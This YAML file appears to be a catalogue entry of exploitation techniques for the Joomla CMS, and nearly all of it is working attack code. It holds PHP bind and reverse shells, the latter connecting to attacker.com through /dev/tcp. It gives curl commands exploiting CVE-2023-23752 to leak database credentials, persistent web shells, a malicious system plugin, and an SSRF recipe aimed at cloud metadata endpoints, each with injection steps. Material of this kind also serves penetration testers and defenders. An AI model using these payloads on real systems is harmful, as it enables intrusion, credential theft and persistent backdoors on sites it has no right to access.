---
comment: "Joomla is a PHP-based CMS. Three primary exploitation paths exist:\n\n1.\
  \ Template editor (admin) \u2014 the built-in template source editor allows editing\
  \ any PHP\n   file in an active template and creating new files. Files are stored\
  \ in\n   templates/<name>/ and served directly by the web server without routing\
  \ restrictions.\n   Joomla 3.x: Extensions > Templates > Templates > select template.\n\
  \   Joomla 4.x: System > Site Templates > select template > edit files.\n\n2. System\
  \ plugin (admin) \u2014 administrators can install a ZIP package that registers\
  \ a\n   system plugin. Once enabled, the plugin's onAfterInitialise() method is\
  \ called on\n   every Joomla page request, providing a persistent execution hook.\n\
  \n3. CVE-2023-23752 (unauthenticated, Joomla 4.0.0\u20134.2.7) \u2014 improper access\
  \ control on\n   the REST API exposes full site configuration (database host, name,\
  \ user, password,\n   secret key) and the user list without authentication. The\
  \ leaked DB credentials can\n   be used to reset the super-admin password via MySQL,\
  \ enabling admin login and\n   subsequent template-based code execution.\n"
functions:
  bind-shell:
  - code: |
      <?php $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",12345);socket_listen($s,1);$c=socket_accept($s);$p=proc_open("/bin/sh",array(0=>$c,1=>$c,2=>$c),$x); ?>
    comment: "Inject into an active template PHP file via the template source editor.\
      \ Trigger by\nvisiting any page \u2014 the page will hang while the bind shell\
      \ awaits a connection on\nport 12345. Requires the PHP sockets extension (default\
      \ on most LAMP stacks).\n"
    connector: tcp-client
    contexts:
      admin:
    tty: false
  file-read:
  - code: "# Leak site configuration \u2014 database credentials, secret key, mailer\
      \ settings\ncurl -s 'http://victim.com/api/index.php/v1/config/application?public=true'\
      \ | python3 -m json.tool\n\n# Leak user accounts \u2014 username, email, group\
      \ membership\ncurl -s 'http://victim.com/api/index.php/v1/users?public=true'\
      \ | python3 -m json.tool\n"
    comment: "CVE-2023-23752: Joomla 4.0.0\u20134.2.7 returns full site configuration\
      \ and the user\nlist from REST API endpoints without authentication when ?public=true\
      \ is appended.\nThe config endpoint exposes MySQL host, database name, username,\
      \ and password in\nplaintext. These credentials can be used to access the database\
      \ directly and reset\nthe super-admin password, enabling admin login and template-based\
      \ code execution.\nRef: https://www.exploit-db.com/exploits/51334\n"
    contexts:
      unauthenticated:
    version: |-
      4.0.0 - 4.2.7
  file-write:
  - code: |
      <?php file_put_contents('shell.php','<?php system($_GET["c"]); ?>'); ?>
    comment: |
      Inject into an active template PHP file via the template editor. Writes shell.php
      into the same template directory (templates/<template_name>/shell.php), creating a
      persistent webshell that survives removal of the injected code from index.php.
      Access at: http://victim.com/templates/<template_name>/shell.php?c=id
    contexts:
      admin:
  rce:
  - code: |
      <?php if(isset($_GET['cmd'])){ passthru($_GET['cmd']); exit; } ?>
    comment: |
      Inject this snippet into any active template PHP file via the built-in source editor.
      Joomla 3.x: Extensions > Templates > Templates > select active template > edit index.php.
      Joomla 4.x: System > Site Templates > select active template > click pencil on index.php.
      Append the snippet and save. Trigger by visiting any page with ?cmd=id appended.
      Command output is returned inline in the HTTP response.
    contexts:
      admin:
  reverse-shell:
  - blind: true
    code: |
      <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &"); ?>
    comment: "Inject into any active template PHP file via the template source editor\
      \ (same\nnavigation as the rce entry). Trigger by visiting any page on the site.\
      \ The reverse\nshell runs asynchronously \u2014 the HTTP response will not confirm\
      \ execution; check the\nlistener for the incoming connection.\n"
    contexts:
      admin:
    listener: tcp-server
    tty: false
  ssrf:
  - code: "# Step 1: set the Joomla update server URL to an internal endpoint (admin)\n\
      curl -s -X PATCH \"http://victim.com/api/index.php/v1/config/application\" \\\
      \n  -H \"Authorization: Bearer <api_token>\" \\\n  -H \"Content-Type: application/json\"\
      \ \\\n  -d '{\"com_config.update_source\": \"custom\", \"com_config.update_server_url_0\"\
      : \"http://169.254.169.254/latest/meta-data/\"}'\n\n# Step 2: trigger the update\
      \ check \u2014 Joomla fetches the configured URL\ncurl -s \"http://victim.com/administrator/index.php?option=com_joomlaupdate&task=update.refreshcache\"\
      \ \\\n  -b \"joomla_admin_session=<session_cookie>\"\n"
    comment: |
      Joomla's update server URL is admin-configurable and fetched server-side when checking
      for updates. Setting it to an internal URL causes the Joomla server to make an outbound
      HTTP GET to that endpoint. The response body is partially reflected in update check errors.

      Alternative vector: Joomla's News Feeds component (com_newsfeeds) fetches RSS/Atom feeds
      from admin-configured external URLs. Create a news feed pointing to an internal endpoint:
        Components > News Feeds > Feeds > New > enter internal URL as the feed link.
      Joomla fetches the URL when the feed is displayed, reaching internal services.

      Target cloud metadata endpoints:
      - AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
      - GCP: http://metadata.google.internal/computeMetadata/v1/
      - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
    contexts:
      admin:
      api_token:
  webshell:
  - code: |
      <?php if(isset($_REQUEST['c'])){echo "<pre>",shell_exec($_REQUEST['c']),"</pre>";}?>
    comment: |
      Create a new PHP file in the active template via the template editor.
      Joomla 3.x: select template > "New File" button > choose PHP type > name it "shell".
      Joomla 4.x: select template > "Create New File" button > name it "shell.php".
      The file lands at templates/<template_name>/shell.php and is directly served by the
      web server. Access at: http://victim.com/templates/<template_name>/shell.php?c=id
    contexts:
      admin:
  - code: |
      <?php
      defined('_JEXEC') or die;
      use Joomla\CMS\Plugin\CMSPlugin;
      class PlgSystemShell extends CMSPlugin
      {
          public function onAfterInitialise()
          {
              if (isset($_REQUEST['c'])) {
                  echo '<pre>', shell_exec($_REQUEST['c']), '</pre>';
                  exit;
              }
          }
      }
    comment: "Deploy as a Joomla system plugin via Extensions > Manage > Install >\
      \ Upload Package File.\nRequired ZIP contents (zip -r shell.zip shell.xml shell.php):\n\
      \n  shell.xml  \u2190 manifest:\n    <?xml version=\"1.0\" encoding=\"UTF-8\"\
      ?>\n    <extension type=\"plugin\" group=\"system\" version=\"3.1\" method=\"\
      upgrade\">\n        <name>shell</name><version>1.0.0</version>\n        <files><filename\
      \ plugin=\"shell\">shell.php</filename></files>\n    </extension>\n\n  shell.php\
      \  \u2190 this file\n\nAfter installation, enable the plugin at Extensions >\
      \ Plugins > search \"shell\".\nOnce enabled, any Joomla page request carrying\
      \ ?c=<command> executes the command\nand returns output at the top of the response,\
      \ before normal page rendering.\n"
    contexts:
      plugin:
...
